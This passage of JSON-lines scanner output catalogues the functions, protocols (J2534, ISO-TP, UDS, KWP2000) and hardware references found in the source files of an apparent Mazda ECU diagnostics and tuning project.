connect_usb(self, vendor_id: int = 0x16C0, product_id: int = 0x05DC) -> bool:"}, {"type": "protocol", "line": 93, "protocol": "0x[0-9A-Fa-f]+", "content": "written = self.connection.write(0x01, command, timeout=1000)"}, {"type": "protocol", "line": 95, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.connection.read(0x81, 64, timeout=1000)"}, {"type": "protocol", "line": 142, "protocol": "0x[0-9A-Fa-f]+", "content": "connect_cmd = struct.pack('<BBI', 0x11, protocol, baudrate)"}, {"type": "protocol", "line": 145, "protocol": "0x[0-9A-Fa-f]+", "content": "return response and response[1] == 0x01"}, {"type": "protocol", "line": 149, "protocol": "0x[0-9A-Fa-f]+", "content": "read_cmd = struct.pack('<BIB', 0x12, address, length)"}, {"type": "protocol", "line": 152, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response[0] == 0x92:"}, {"type": "protocol", "line": 159, "protocol": "0x[0-9A-Fa-f]+", "content": "write_cmd = struct.pack('<BI', 0x13, address) + data"}, {"type": "protocol", "line": 162, "protocol": "0x[0-9A-Fa-f]+", "content": "return response and response[1] == 0x01"}], "hardware_assumptions": [{"type": "hardware", "line": 3, "hardware": "ABS", "content": "Abstracts communication with physical/virtual Cobb AP hardware"}, {"type": "hardware", "line": 140, "hardware": "ECU", "content": "def ecu_connect(self, protocol: int = 6, baudrate: int = 500000) -> bool:"}, {"type": "hardware", "line": 141, "hardware": "ECU", "content": "\"\"\"Connect to ECU through hardware interface\"\"\""}, {"type": "hardware", "line": 147, "hardware": "ECU", "content": "def read_ecu_memory(self, address: int, length: int) -> Optional[bytes]:"}, {"type": "hardware", "line": 148, "hardware": "ECU", "content": "\"\"\"Read ECU memory through hardware interface\"\"\""}, {"type": "hardware", "line": 157, "hardware": "ECU", "content": "def write_ecu_memory(self, address: int, data: bytes) -> bool:"}, {"type": "hardware", "line": 158, "hardware": "ECU", "content": "\"\"\"Write ECU memory through hardware interface\"\"\""}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["cobb"]}
{"file_path": "cobbreadme.md", "lines_read": 25, "features_found": [{"type": "url_found", "count": 1}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["cobb"]}
{"file_path": "comms/iso15765_transport.py", "lines_read": 111, "features_found": [{"type": "function", "name": "__init__", "line": 25}, {"type": "function", "name": "_build_can_frame", "line": 30}, {"type": "function", "name": "_parse_can_frame", "line": 42}, {"type": "function", "name": "request", "line": 50}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": ".j2534_api", "line": null}, {"type": "import", "module": ".j2534_device", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Optional", "line": null}, {"type": "import", "module": "PASSTHRU_MSG,", "line": null}, {"type": "import", "module": "J2534Device", "line": null}], "components_found": [{"type": "class", "name": "IsoTpError", "line": 21}, {"type": "class", "name": "IsoTpTransport", "line": 24}], "algorithms": [], "protocols": [{"type": "protocol", "line": 1, "protocol": "ISO-TP", "content": "\"\"\"ISO-TP (ISO 15765-2) transport over J2534."}, {"type": "protocol", "line": 1, "protocol": "J2534", "content": "\"\"\"ISO-TP (ISO 15765-2) transport over J2534."}, {"type": "protocol", "line": 4, "protocol": "UDS", "content": "UDS traffic. It is not optimized for very high throughput."}, {"type": "protocol", "line": 12, "protocol": "J2534", "content": "from .j2534_device import J2534Device"}, {"type": "protocol", "line": 16, "protocol": "0x[0-9A-Fa-f]+", "content": "PCI_SINGLE = 0x0"}, {"type": "protocol", "line": 17, "protocol": "0x[0-9A-Fa-f]+", "content": "PCI_FIRST  = 0x1"}, {"type": "protocol", "line": 18, "protocol": "0x[0-9A-Fa-f]+", "content": "PCI_CONSEC = 0x2"}, {"type": "protocol", "line": 19, "protocol": "0x[0-9A-Fa-f]+", "content": "PCI_FLOW   = 0x3"}, {"type": "protocol", "line": 25, "protocol": "J2534", "content": "def __init__(self, dev: J2534Device, tx_id: int, rx_id: int):"}, {"type": "protocol", "line": 35, "protocol": "0x[0-9A-Fa-f]+", "content": "data[0] = (can_id >> 24) & 0xFF"}, {"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "data[1] = (can_id >> 16) & 0xFF"}, {"type": "protocol", "line": 37, "protocol": "0x[0-9A-Fa-f]+", "content": "data[2] = (can_id >> 8) & 0xFF"}, {"type": "protocol", "line": 38, "protocol": "0x[0-9A-Fa-f]+", "content": "data[3] = can_id & 0xFF"}, {"type": "protocol", "line": 45, "protocol": "J2534", "content": "raise IsoTpError(\"Short frame from J2534\")"}, {"type": "protocol", "line": 51, "protocol": "ISO-TP", "content": "\"\"\"Send a single ISO-TP request and return the reassembled response.\"\"\""}, {"type": "protocol", "line": 64, "protocol": "0x[0-9A-Fa-f]+", "content": "ff_pci = (PCI_FIRST << 4) | ((total_len >> 8) & 0x0F)"}, {"type": "protocol", "line": 65, "protocol": "0x[0-9A-Fa-f]+", "content": "ff_len_low = total_len & 0xFF"}, {"type": "protocol", "line": 77, "protocol": "0x[0-9A-Fa-f]+", "content": "cf_pci = (PCI_CONSEC << 4) | (seq & 0x0F)"}, {"type": "protocol", "line": 82, "protocol": "0x[0-9A-Fa-f]+", "content": "seq = (seq + 1) & 0x0F"}, {"type": "protocol", "line": 95, "protocol": "0x[0-9A-Fa-f]+", "content": "pci_type = (pl[0] >> 4) & 0x0F"}, {"type": "protocol", "line": 97, "protocol": "0x[0-9A-Fa-f]+", "content": "length = pl[0] & 0x0F"}, {"type": "protocol", "line": 101, "protocol": "0x[0-9A-Fa-f]+", "content": "high = pl[0] & 0x0F"}], "hardware_assumptions": [{"type": "hardware", "line": 90, "hardware": "ECU", "content": "raise IsoTpError(\"No response from ECU\")"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "comms/j2534_api.py", "lines_read": 42, "features_found": [{"type": "function", "name": "set_data", "line": 33}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "ctypes", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "ctypes", "line": null}, {"type": "import", "module": "c_ulong,", "line": null}], "components_found": [{"type": "class", "name": "PASSTHRU_MSG", "line": 22}], "algorithms": [], "protocols": [{"type": "protocol", "line": 1, "protocol": "J2534", "content": "\"\"\"Low-level J2534 API definitions using ctypes."}, {"type": "protocol", "line": 4, "protocol": "J2534", "content": "vendor-supplied J2534 DLLs. It does not contain any Mazda-specific logic."}, {"type": "protocol", "line": 19, "protocol": "0x[0-9A-Fa-f]+", "content": "TX_MSG_TYPE = 0x00000000"}, {"type": "protocol", "line": 20, "protocol": "0x[0-9A-Fa-f]+", "content": "RX_MSG_TYPE = 0x00000001"}], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "comms/j2534_device.py", "lines_read": 104, "features_found": [{"type": "function", "name": "__init__", "line": 19}, {"type": "function", "name": "_define_prototypes", "line": 27}, {"type": "function", "name": "open", "line": 52}, {"type": "function", "name": "connect_iso15765", "line": 58}, {"type": "function", "name": "write_msg", "line": 70}, {"type": "function", "name": "read_msgs", "line": 80}, {"type": "function", "name": "close", "line": 91}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "ctypes", "line": null}, {"type": "import", "module": ".j2534_api", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "ctypes", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "c_ulong,", "line": null}, {"type": "import", "module": "PASSTHRU_MSG,", "line": null}], "components_found": [{"type": "class", "name": "J2534Error", "line": 15}, {"type": "class", "name": "J2534Device", "line": 18}], "algorithms": [], "protocols": [{"type": "protocol", "line": 1, "protocol": "J2534", "content": "\"\"\"Wrapper around a single J2534 DLL/device."}, {"type": "protocol", "line": 3, "protocol": "CAN", "content": "Provides a Pythonic interface for opening the device, making a CAN ISO15765"}, {"type": "protocol", "line": 15, "protocol": "J2534", "content": "class J2534Error(Exception):"}, {"type": "protocol", "line": 18, "protocol": "J2534", "content": "class J2534Device:"}, {"type": "protocol", "line": 19, "protocol": "J2534", "content": "def __init__(self, dll_path: str, name: str = \"Unknown J2534 device\"):"}, {"type": "protocol", "line": 55, "protocol": "J2534", "content": "raise J2534Error(f\"{self.name}: PassThruOpen failed ({result})\")"}, {"type": "protocol", "line": 56, "protocol": "J2534", "content": "log.info(\"Opened J2534 device %s (id=%s)\", self.name, self.device_id.value)"}, {"type": "protocol", "line": 67, "protocol": "J2534", "content": "raise J2534Error(f\"{self.name}: PassThruConnect failed ({result})\")"}, {"type": "protocol", "line": 78, "protocol": "J2534", "content": "raise J2534Error(f\"PassThruWriteMsgs failed ({result})\")"}, {"type": "protocol", "line": 96, "protocol": "J2534", "content": "log.exception(\"Error disconnecting J2534 channel\")"}, {"type": "protocol", "line": 102, "protocol": "J2534", "content": "log.exception(\"Error closing J2534 device\")"}], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "comms/j2534_manager.py", "lines_read": 81, "features_found": [{"type": "function", "name": "__init__", "line": 24}, {"type": "function", "name": "_load_config", "line": 30}, {"type": "function", "name": "_dll_on_path", "line": 47}, {"type": "function", "name": "scan_devices", "line": 54}, {"type": "function", "name": "auto_connect_first", "line": 69}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": ".j2534_device", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "List,", "line": null}, {"type": "import", "module": "yaml", "line": null}, {"type": "import", "module": "J2534Device,", "line": null}], "components_found": [{"type": "class", "name": "DeviceConfig", "line": 16}, {"type": "class", "name": "J2534Manager", "line": 23}], "algorithms": [], "protocols": [{"type": "protocol", "line": 1, "protocol": "J2534", "content": "\"\"\"Manager for multiple J2534 devices based on config/j2534_devices.yml.\"\"\""}, {"type": "protocol", "line": 11, "protocol": "J2534", "content": "from .j2534_device import J2534Device, J2534Error"}, {"type": "protocol", "line": 23, "protocol": "J2534", "content": "class J2534Manager:"}, {"type": "protocol", "line": 27, "protocol": "J2534", "content": "self.devices: list[J2534Device] = []"}, {"type": "protocol", "line": 32, "protocol": "J2534", "content": "log.warning(\"J2534 config file not found: %s\", self.config_path)"}, {"type": "protocol", "line": 54, "protocol": "J2534", "content": "def scan_devices(self) -> list[J2534Device]:"}, {"type": "protocol", "line": 55, "protocol": "J2534", "content": "devices: list[J2534Device] = []"}, {"type": "protocol", "line": 62, "protocol": "J2534", "content": "dev = J2534Device(cfg.dll_windows, name=cfg.name)"}, {"type": "protocol", "line": 65, "protocol": "J2534", "content": "log.exception(\"Failed to load J2534 DLL %s\", cfg.dll_windows)"}, {"type": "protocol", "line": 69, "protocol": "J2534", "content": "def auto_connect_first(self) -> Optional[J2534Device]:"}, {"type": "protocol", "line": 77, "protocol": "J2534", "content": "except J2534Error:"}, {"type": "protocol", "line": 78, "protocol": "J2534", "content": "log.exception(\"Failed to connect to J2534 device %s\", dev.name)"}], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "comms/kwp2000_protocol.py", "lines_read": 35, "features_found": [{"type": "function", "name": "__init__", "line": 14}, {"type": "function", "name": "_req", "line": 17}, {"type": "function", "name": "start_diagnostic_session", "line": 27}, {"type": "function", "name": "read_data_by_local_id", "line": 30}, {"type": "function", "name": "clear_dtc", "line": 33}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": ".iso15765_transport", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "IsoTpTransport,", "line": null}], "components_found": [{"type": "class", "name": "KwpError", "line": 10}, {"type": "class", "name": "KwpClient", "line": 13}], "algorithms": [], "protocols": [{"type": "protocol", "line": 1, "protocol": "KWP", "content": "\"\"\"Minimal KWP2000 helper built on IsoTpTransport."}, {"type": "protocol", "line": 3, "protocol": "KWP", "content": "Some Mazda modules may still use KWP-style services for certain functions."}, {"type": "protocol", "line": 21, "protocol": "KWP", "content": "raise KwpError(\"Empty KWP response\")"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "if resp[0] != sid + 0x40:"}, {"type": "protocol", "line": 24, "protocol": "KWP", "content": "raise KwpError(f\"Unexpected KWP response SID 0x{resp[0]:02X}\")"}, {"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "def start_diagnostic_session(self, session: int = 0x85) -> None:"}, {"type": "protocol", "line": 28, "protocol": "0x[0-9A-Fa-f]+", "content": "self._req(0x10, bytes([session]))"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "return self._req(0x21, bytes([lid]))"}, {"type": "protocol", "line": 34, "protocol": "0x[0-9A-Fa-f]+", "content": "self._req(0x14)"}], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "comms/mazda_ecu.py", "lines_read": 114, "features_found": [{"type": "function", "name": "__init__", "line": 22}, {"type": "function", "name": "connect", "line": 32}, {"type": "function", "name": "disconnect", "line": 46}, {"type": "function", "name": "read_live_data", "line": 56}, {"type": "function", "name": "read_dtc_ecm", "line": 62}, {"type": "function", "name": "flash_rom", "line": 73}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": ".j2534_manager", "line": null}, {"type": "import", "module": ".iso15765_transport", "line": null}, {"type": "import", "module": ".uds_protocol", "line": null}, {"type": "import", "module": "diagnostics.live_data_service", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "List,", "line": null}, {"type": "import", "module": "J2534Manager", "line": null}, {"type": "import", "module": "IsoTpTransport", "line": null}, {"type": "import", "module": "UdsClient,", "line": null}, {"type": "import", "module": "LiveData,", "line": null}], "components_found": [{"type": "class", "name": "MazdaEcu", "line": 19}], "algorithms": [], "protocols": [{"type": "protocol", "line": 3, "protocol": "ISO-TP", "content": "This class hides the details of J2534, ISO-TP, and UDS/KWP and exposes"}, {"type": "protocol", "line": 3, "protocol": "UDS", "content": "This class hides the details of J2534, ISO-TP, and UDS/KWP and exposes"}, {"type": "protocol", "line": 3, "protocol": "J2534", "content": "This class hides the details of J2534, ISO-TP, and UDS/KWP and exposes"}, {"type": "protocol", "line": 3, "protocol": "KWP", "content": "This class hides the details of J2534, ISO-TP, and UDS/KWP and exposes"}, {"type": "protocol", "line": 11, "protocol": "J2534", "content": "from .j2534_manager import J2534Manager"}, {"type": "protocol", "line": 23, "protocol": "J2534", "content": "self.jm = J2534Manager(config_path)"}, {"type": "protocol", "line": 29, "protocol": "0x[0-9A-Fa-f]+", "content": "self.tx_id = 0x7E0"}, {"type": "protocol", "line": 30, "protocol": "0x[0-9A-Fa-f]+", "content": "self.rx_id = 0x7E8"}, {"type": "protocol", "line": 35, "protocol": "J2534", "content": "raise RuntimeError(\"No J2534 device available/connected\")"}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "self.uds.diag_session_control(0x03)"}, {"type": "protocol", "line": 57, "protocol": "UDS", "content": "\"\"\"Read a core set of live data items via UDS DIDs.\"\"\""}, {"type": "protocol", "line": 63, "protocol": "UDS", "content": "\"\"\"Read ECM DTCs via a UDS routine or manufacturer-specific DID."}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "def flash_rom(self, rom_image: bytes, start_addr: int, block_size: int = 0x400) -> None:"}, {"type": "protocol", "line": 88, "protocol": "0x[0-9A-Fa-f]+", "content": "self.uds.diag_session_control(0x02)  # programming session"}, {"type": "protocol", "line": 113, "protocol": "0x[0-9A-Fa-f]+", "content": "self.uds.ecu_reset(0x01)"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "\"\"\"High level Mazda ECU interface for MUTS."}, {"type": "hardware", "line": 19, "hardware": "ECU", "content": "class MazdaEcu:"}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "\"\"\"ECU interface focused on the 2011 Mazdaspeed 3 platform.\"\"\""}, {"type": "hardware", "line": 59, "hardware": "ECU", "content": "raise RuntimeError(\"ECU not connected\")"}, {"type": "hardware", "line": 74, "hardware": "ECU", "content": "\"\"\"Flash a full ROM image to the ECU."}, {"type": "hardware", "line": 81, "hardware": "ECU", "content": "raise RuntimeError(\"ECU not connected\")"}, {"type": "hardware", "line": 112, "hardware": "ECU", "content": "log.info(\"Flash complete, requesting ECU reset\")"}, {"type": "hardware", "line": 113, "hardware": "ECU", "content": "self.uds.ecu_reset(0x01)"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "comms/uds_protocol.py", "lines_read": 76, "features_found": [{"type": "function", "name": "__init__", "line": 15}, {"type": "function", "name": "_req", "line": 18}, {"type": "function", "name": "diag_session_control", "line": 32}, {"type": "function", "name": "ecu_reset", "line": 35}, {"type": "function", "name": "read_data_by_id", "line": 38}, {"type": "function", "name": "write_data_by_id", "line": 42}, {"type": "function", "name": "security_access", "line": 46}, {"type": "function", "name": "routine_control", "line": 54}, {"type": "function", "name": "request_download", "line": 58}, {"type": "function", "name": "transfer_data", "line": 65}, {"type": "function", "name": "transfer_exit", "line": 68}, {"type": "function", "name": "tester_present", "line": 71}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": ".iso15765_transport", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Optional", "line": null}, {"type": "import", "module": "IsoTpTransport,", "line": null}], "components_found": [{"type": "class", "name": "UdsError", "line": 11}, {"type": "class", "name": "UdsClient", "line": 14}], "algorithms": [], "protocols": [{"type": "protocol", "line": 1, "protocol": "UDS", "content": "\"\"\"UDS (ISO 14229) protocol helper on top of IsoTpTransport.\"\"\""}, {"type": "protocol", "line": 22, "protocol": "UDS", "content": "raise UdsError(\"Empty UDS response\")"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "if resp_sid == 0x7F:  # negative response"}, {"type": "protocol", "line": 28, "protocol": "0x[0-9A-Fa-f]+", "content": "if expect_positive and resp_sid != (sid + 0x40):"}, {"type": "protocol", "line": 29, "protocol": "UDS", "content": "raise UdsError(f\"Unexpected UDS response SID 0x{resp_sid:02X} to 0x{sid:02X}\")"}, {"type": "protocol", "line": 33, "protocol": "0x[0-9A-Fa-f]+", "content": "self._req(0x10, bytes([session]))"}, {"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "self._req(0x11, bytes([reset_type]))"}, {"type": "protocol", "line": 40, "protocol": "0x[0-9A-Fa-f]+", "content": "return self._req(0x22, did_bytes)"}, {"type": "protocol", "line": 44, "protocol": "0x[0-9A-Fa-f]+", "content": "self._req(0x2E, did_bytes + data)"}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "return self._req(0x27, bytes([level]))"}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "return self._req(0x27, bytes([level]) + key)"}, {"type": "protocol", "line": 56, "protocol": "0x[0-9A-Fa-f]+", "content": "return self._req(0x31, bytes([control_type]) + rid + data)"}, {"type": "protocol", "line": 62, "protocol": "0x[0-9A-Fa-f]+", "content": "fmt = bytes([0x00, 0x44])  # dummy format"}, {"type": "protocol", "line": 63, "protocol": "0x[0-9A-Fa-f]+", "content": "return self._req(0x34, fmt + addr_bytes + size_bytes)"}, {"type": "protocol", "line": 66, "protocol": "0x[0-9A-Fa-f]+", "content": "return self._req(0x36, bytes([block_num]) + chunk)"}, {"type": "protocol", "line": 69, "protocol": "0x[0-9A-Fa-f]+", "content": "self._req(0x37)"}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "self._req(0x3E, bytes([0x00]), expect_positive=True)"}], "hardware_assumptions": [{"type": "hardware", "line": 35, "hardware": "ECU", "content": "def ecu_reset(self, reset_type: int = 1) -> None:"}, {"type": "hardware", "line": 46, "hardware": "ECU", "content": "def security_access(self, level: int, seed: Optional[bytes] = None, key: Optional[bytes] = None) -> "}, {"type": "hardware", "line": 51, "hardware": "ECU", "content": "raise UdsError(\"Key must be provided when sending security response\")"}], "security_logic": [{"type": "security_pattern", "line": 46, "pattern": "key", "content": "def security_access(self, level: int, seed: Optional[bytes] = None, key: Optional[bytes] = None) -> "}, {"type": "security_pattern", "line": 46, "pattern": "seed", "content": "def security_access(self, level: int, seed: Optional[bytes] = None, key: Optional[bytes] = None) -> "}, {"type": "security_pattern", "line": 46, "pattern": "security_access", "content": "def security_access(self, level: int, seed: Optional[bytes] = None, key: Optional[bytes] = None) -> "}, {"type": "security_pattern", "line": 47, "pattern": "seed", "content": "if seed is None:"}, {"type": "security_pattern", "line": 50, "pattern": "key", "content": "if key is None:"}, {"type": "security_pattern", "line": 51, "pattern": "key", "content": "raise UdsError(\"Key must be provided when sending security response\")"}, {"type": "security_pattern", "line": 52, "pattern": "key", "content": "return self._req(0x27, bytes([level]) + key)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "config/defaults.yml", "lines_read": 2, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "config/j2534_devices.yml", "lines_read": 2, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "config/logging.yml", "lines_read": 2, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "config/maps_mps3_gen2.yml", "lines_read": 2, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "config/safety_limits.yml", "lines_read": 2, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "core/app_state.py", "lines_read": 389, "features_found": [{"type": "function", "name": "get_app_state", "line": 386}, {"type": "function", "name": "__init__", "line": 94}, {"type": "function", "name": "_initialize_state", "line": 108}, {"type": "function", "name": "_load_configuration", "line": 126}, {"type": "function", "name": "set_state", "line": 154}, {"type": "function", "name": "get_state", "line": 162}, {"type": "function", "name": "update_ecu_data", "line": 167}, {"type": "function", "name": "get_ecu_data", "line": 189}, {"type": "function", "name": "update_tuning_parameters", "line": 194}, {"type": "function", "name": "get_tuning_parameters", "line": 213}, {"type": "function", "name": "update_system_status", "line": 218}, {"type": "function", "name": "get_system_status", "line": 234}, {"type": "function", "name": "set_performance_mode", "line": 239}, {"type": "function", "name": "set_error", "line": 258}, {"type": "function", "name": "clear_error", "line": 266}, {"type": "function", "name": "register_callback", "line": 273}, {"type": "function", "name": "unregister_callback", "line": 281}, {"type": "function", "name": "_notify_callbacks", "line": 291}, {"type": "function", "name": "_add_to_history", "line": 300}, {"type": "function", "name": "get_history", "line": 317}, {"type": "function", "name": "get_config", "line": 327}, {"type": "function", "name": "set_config", "line": 334}, {"type": "function", "name": "export_state", "line": 340}, {"type": "function", "name": "import_state", "line": 352}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "state:", "line": null}], "components_found": [{"type": "class", "name": "SystemState", "line": 18}, {"type": "class", "name": "PerformanceMode", "line": 28}, {"type": "class", "name": "ECUData", "line": 38}, {"type": "class", "name": "TuningParameters", "line": 60}, {"type": "class", "name": "SystemStatus", "line": 76}, {"type": "class", "name": "AppStateManager", "line": 88}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 38, "hardware": "ECU", "content": "class ECUData:"}, {"type": "hardware", "line": 39, "hardware": "ECU", "content": "\"\"\"Real-time ECU sensor data\"\"\""}, {"type": "hardware", "line": 48, "hardware": "vehicle", "content": "vehicle_speed: float = 0.0"}, {"type": "hardware", "line": 79, "hardware": "ECU", "content": "ecu_connected: bool = False"}, {"type": "hardware", "line": 80, "hardware": "ECU", "content": "security_unlocked: bool = False"}, {"type": "hardware", "line": 97, "hardware": "ECU", "content": "self._ecu_data = ECUData()"}, {"type": "hardware", "line": 167, "hardware": "ECU", "content": "def update_ecu_data(self, **kwargs):"}, {"type": "hardware", "line": 168, "hardware": "ECU", "content": "\"\"\"Update ECU sensor data\"\"\""}, {"type": "hardware", "line": 173, "hardware": "ECU", "content": "if hasattr(self._ecu_data, key):"}, {"type": "hardware", "line": 174, "hardware": "ECU", "content": "setattr(self._ecu_data, key, value)"}, {"type": "hardware", "line": 177, "hardware": "ECU", "content": "self._ecu_data.timestamp = time.time()"}, {"type": "hardware", "line": 180, "hardware": "ECU", "content": "self._add_to_history('ecu_data', self._ecu_data)"}, {"type": "hardware", "line": 183, "hardware": "ECU", "content": "self._notify_callbacks('ecu_data_update', self._ecu_data)"}, {"type": "hardware", "line": 186, "hardware": "ECU", "content": "logger.error(f\"Failed to update ECU data: {e}\")"}, {"type": "hardware", "line": 187, "hardware": "ECU", "content": "self.set_error(f\"ECU data update failed: {e}\")"}, {"type": "hardware", "line": 189, "hardware": "ECU", "content": "def get_ecu_data(self) -> ECUData:"}, {"type": "hardware", "line": 190, "hardware": "ECU", "content": "\"\"\"Get current ECU data\"\"\""}, {"type": "hardware", "line": 192, "hardware": "ECU", "content": "return self._ecu_data"}, {"type": "hardware", "line": 345, "hardware": "ECU", "content": "'ecu_data': self._ecu_data.__dict__,"}, {"type": "hardware", "line": 359, "hardware": "ECU", "content": "if 'ecu_data' in state_data:"}, {"type": "hardware", "line": 360, "hardware": "ECU", "content": "for key, value in state_data['ecu_data'].items():"}, {"type": "hardware", "line": 361, "hardware": "ECU", "content": "if hasattr(self._ecu_data, key):"}, {"type": "hardware", "line": 362, "hardware": "ECU", "content": "setattr(self._ecu_data, key, value)"}], "security_logic": [{"type": "security_pattern", "line": 172, "pattern": "key", "content": "for key, value in kwargs.items():"}, {"type": "security_pattern", "line": 173, "pattern": "key", "content": "if hasattr(self._ecu_data, key):"}, {"type": "security_pattern", "line": 174, "pattern": "key", "content": "setattr(self._ecu_data, key, value)"}, {"type": "security_pattern", "line": 199, "pattern": "key", "content": "for key, value in kwargs.items():"}, {"type": "security_pattern", "line": 200, "pattern": "key", "content": "if hasattr(self._tuning_params, key):"}, {"type": "security_pattern", "line": 201, "pattern": "key", "content": "setattr(self._tuning_params, key, value)"}, {"type": "security_pattern", "line": 223, "pattern": "key", "content": "for key, value in kwargs.items():"}, {"type": "security_pattern", "line": 224, "pattern": "key", "content": "if hasattr(self._system_status, key):"}, {"type": "security_pattern", "line": 225, "pattern": "key", "content": "setattr(self._system_status, key, value)"}, {"type": "security_pattern", "line": 327, "pattern": "key", "content": "def get_config(self, key: Optional[str] = None) -> Any:"}, {"type": "security_pattern", "line": 330, "pattern": "key", "content": "if key:"}, {"type": "security_pattern", "line": 331, "pattern": "key", "content": "return self._config.get(key)"}, {"type": "security_pattern", "line": 334, "pattern": "key", "content": "def set_config(self, key: str, value: Any):"}, {"type": "security_pattern", "line": 337, "pattern": "key", "content": "self._config[key] = value"}, {"type": "security_pattern", "line": 338, "pattern": "key", "content": "logger.info(f\"Configuration updated: {key} = {value}\")"}, {"type": "security_pattern", "line": 360, "pattern": "key", "content": "for key, value in state_data['ecu_data'].items():"}, {"type": "security_pattern", "line": 361, "pattern": "key", "content": "if hasattr(self._ecu_data, key):"}, {"type": "security_pattern", "line": 362, "pattern": "key", "content": "setattr(self._ecu_data, key, value)"}, {"type": "security_pattern", "line": 365, "pattern": "key", "content": "for key, value in state_data['tuning_params'].items():"}, {"type": "security_pattern", "line": 366, "pattern": "key", "content": "if hasattr(self._tuning_params, key):"}, {"type": "security_pattern", "line": 367, "pattern": "key", "content": "setattr(self._tuning_params, key, value)"}, {"type": "security_pattern", "line": 370, "pattern": "key", "content": "for key, value in state_data['system_status'].items():"}, {"type": "security_pattern", "line": 371, "pattern": "key", "content": "if hasattr(self._system_status, key):"}, {"type": "security_pattern", "line": 372, "pattern": "key", "content": "setattr(self._system_status, key, value)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "core/checksum.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
